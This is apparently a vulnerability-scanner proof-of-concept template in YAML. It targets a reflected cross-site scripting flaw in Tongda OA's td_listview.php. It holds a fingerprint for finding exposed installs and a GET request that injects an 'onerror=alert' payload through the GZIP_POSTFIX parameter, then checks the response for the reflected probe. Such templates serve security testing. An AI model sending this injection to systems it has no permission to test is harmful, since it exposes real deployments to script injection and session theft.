id: poc-yaml-tongda-td-listview-php-xss
info:
  name: 通达OA td_listview.php 反射型XSS漏洞
  severity: medium
  tags:
  - xss
  finger: 通达OA
  hunter: web.icon=="1205af91d6b1638c23de1132ae0c7e0b"
variables:
  t1: md5(random_int(100,10000))
requests:
- method: GET
  path: /module/html_editor/editor/plugins/td_listview/td_listview.php?GZIP_POSTFIX=%22+onerror=alert("{{.t1}}")+a=1
  expression: status_code == 200 && contains(body,"onerror=alert") && contains(body,t1)
    && contains(body,"内部数据")
transport: http
